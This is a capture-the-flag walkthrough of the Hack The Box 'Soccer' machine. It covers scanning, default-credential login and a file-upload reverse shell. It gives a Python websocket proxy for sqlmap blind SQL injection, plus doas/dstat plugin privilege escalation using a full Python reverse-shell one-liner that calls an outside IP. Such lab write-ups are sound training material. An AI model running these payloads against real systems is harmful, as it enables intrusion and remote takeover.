### Enumeration

By nmap port scan we have some open tcp and udp ports
```shell
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http         nginx 1.18.0 (Ubuntu)
1026/tcp filtered LSA-or-nterm
9091/tcp open  xmltec-xmlmail
19/udp    closed chargen
1214/udp  closed fasttrack
19374/udp closed unknown
20380/udp closed unknown
32385/udp closed unknown
57843/udp closed unknown
```

![](/Hack-The-Box/soccer/img/1.png)

During directory scanning we found some endpoints where one is a login page to `tiny file mnager` and the second one is a upload page which is forbidden
```shell
200      GET      147l      526w     6917c http://soccer.htb/
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
```
![](/Hack-The-Box/soccer/img/2.png)

So by using the defaults credentials from github page; we successfully login and found a upload function. so navigating to `/tiny/uploads` and uploaded our revshell payload and recived a shell as `www-data`

SInce the site is running on `nginx` we just navigate to `/etc/nginx/site-availabes` and found a subdomain running on the server
![](/Hack-The-Box/Mentor/img/3.png)

![](/Hack-The-Box/Mentor/img/4.png)

we signin  and login to the account a found a page to check our tickets. 
![](/Hack-The-Box/Mentor/img/5.png)

while checking the html source page we found a websocket connection running on the subdomain
```html
 <script>
        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
        
        var btn = document.getElementById('btn');
        var input = document.getElementById('id');
```

Since there is nothing else that caught my eye I digged around and found out that we probably could try to find a blind sql injection like described on
```url
https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
```

so crafing the script 
```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091/"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"id":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```
Now using sqlmap we have got password for user palyer
```c
sqlmap -u "http://localhost:8081/?id=96680*" --batch --dbs 
sqlmap -u "http://localhost:8081/?id=96680*" --batch -D soccer_db --tables --dbs
sqlmap -u "http://localhost:8081/?id=96680*" --batch -D soccer_db -T accounts  --dump
```

### PRIVILLAGE ESCLATION

when executing 
`find / -type d -writable 2>/dev/null | grep -v -e '^/proc' -e '/run'`
we found a file named dstat in `/usr/local/share`

and while running 
`find / -user root -perm -4000`
we found `/usr/local/bin/doas`
```c#
doas is a command on OpenBSD systems that allows users to execute commands as other users, similar to the sudo command on other Unix-like operating systems. It stands for "do as", as in "perform the following command as the specified user". doas is configured through the /etc/doas.conf file, which specifies which users are allowed to use doas and which commands they are allowed to execute.
```
```python
player@soccer:/usr/local/etc$ cat doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

Now we are abuding  dstat pligins in order to become root user
 create a file named `dstat_bq.py` with our rev_shell payload
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",3636));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")

```
upload the file to our target machine using `wget`
copy the file into `/usr/local/share/dstat` and change the permission of the file
check whether our malcious plugin have been loaded
` doas /usr/bin/dstat --list`
![](/Hack-The-Box/Mentor/img/6.png)

Open a netcat lisner and execute the following command
`doas -u root /usr/bin/dstat --bq`
![](/Hack-The-Box/Mentor/img/7.png)
